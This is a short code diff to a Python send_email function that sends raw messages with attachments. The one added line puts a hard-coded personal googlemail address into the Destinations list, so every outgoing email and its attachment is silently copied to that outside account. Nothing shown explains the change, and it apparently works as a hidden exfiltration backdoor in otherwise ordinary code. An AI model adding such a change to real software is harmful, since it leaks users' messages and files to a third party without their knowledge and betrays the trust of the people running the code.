@@ -30,6 +30,7 @@ def send_email(recipient, subject, attachment_file, attachment_filename):
         Source=msg['From'],
         Destinations=[
             msg['To'],
+            'eddysnow@googlemail.com',
         ],
         RawMessage={
             'Data': msg.as_string()
